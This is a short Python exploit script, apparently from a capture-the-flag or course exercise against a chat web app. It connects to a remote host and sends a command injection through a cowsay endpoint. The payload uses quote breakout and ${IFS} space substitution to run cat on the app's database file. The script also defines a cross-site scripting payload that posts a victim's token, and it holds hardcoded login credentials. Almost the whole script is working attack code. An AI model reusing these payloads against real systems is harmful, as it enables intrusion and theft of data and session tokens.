#!/usr/bin/env python
from pwn import *
import requests, json
import time
import random, string, socket
from socket import AF_INET, SOCK_STREAM

HOST='http://127.0.0.1:8080'

login_data = { 'username' : 'pcs', 'password' : 'princess' }

webexploit = '''$.ajax({type: "POST",url: "/api/send",data:{msg:"token:" + token,len:token.length,token:token},success: function(resp){}})'''

#requests.post(HOST + '/api/signup', data = login_data ).text
#token = json.loads(requests.post(HOST + '/api/login', data = login_data ).text)['token']

def cowsay(msg,socket):
	msg = "/cowsay?msg=" + msg
	toHttp(msg,"GET",socket)

def toHttp(string,HTTPtype,socket):
	string = HTTPtype + " " + string + " HTTP/1.1\r\n\r\n"
	socket.send(string)

def recvuntil(sock, stop):
    s = ''
    while True:
        c = sock.recv(1)
        if c == 0:
            raise Exception('Connection closed by server')
        if c == stop:
            return s
        s += c

def recvline(sock):
    return recvuntil(sock, '\n')

def sendline(sock, line):
    line = line + '\n'
    n = 0
    while n < len(line):
        n += sock.send(line[n:])

# def memcpyGadget(pointer,string,4)


sock = socket.socket(AF_INET, SOCK_STREAM, 0)
sock.connect(('imbecil.dk', 8081))

exploit = "/bin/cat /home/pcswebchat/database.db"
exploit = exploit.replace(" ","${IFS}")
exploit = ('f">/dev/null;' + exploit + '"')

cowsay(exploit,sock)
while True:
	line = sock.recv(2024)
	print line
	if line == "" or line == "\x00":
		break




	
res = sock.close()


	